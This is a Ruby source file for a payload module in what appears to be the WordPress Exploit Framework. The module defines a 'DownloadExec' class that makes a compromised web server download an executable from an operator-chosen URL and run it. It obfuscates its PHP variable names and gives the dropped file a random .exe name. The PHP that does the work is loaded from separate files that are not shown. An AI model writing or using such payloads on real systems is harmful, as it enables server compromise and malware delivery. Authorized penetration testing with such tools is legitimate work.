# frozen_string_literal: true

module Wpxf::Payloads
  # Downloads an executable and runs it in the context of the web server.
  class DownloadExec < Wpxf::Payload
    include Wpxf

    def initialize
      super

      register_options([
        StringOption.new(
          name: 'executable_url',
          required: true,
          desc: 'The URL to download the executable file from'
        )
      ])
    end

    def generate_php_vars
      generate_vars([
        :cmd, :disabled, :handle, :output, :pipes, :fp,
        :tempfile, :fname, :fd_in, :fd_out
      ])
    end

    def obfuscated_variables
      super + ['cmd', 'tempfile', 'fname', 'fd_in', 'fd_out', 'output', 'executable_url', 'exename']
    end

    def constants
      {
        'executable_url' => datastore['executable_url'],
        'exename' => "#{Utility::Text.rand_alpha(rand(5..10))}.exe"
      }
    end

    def raw
      "#{DataFile.new('php', 'exec_methods.php').php_content}"\
      "#{DataFile.new('php', 'download_exec.php').php_content}"
    end
  end
end
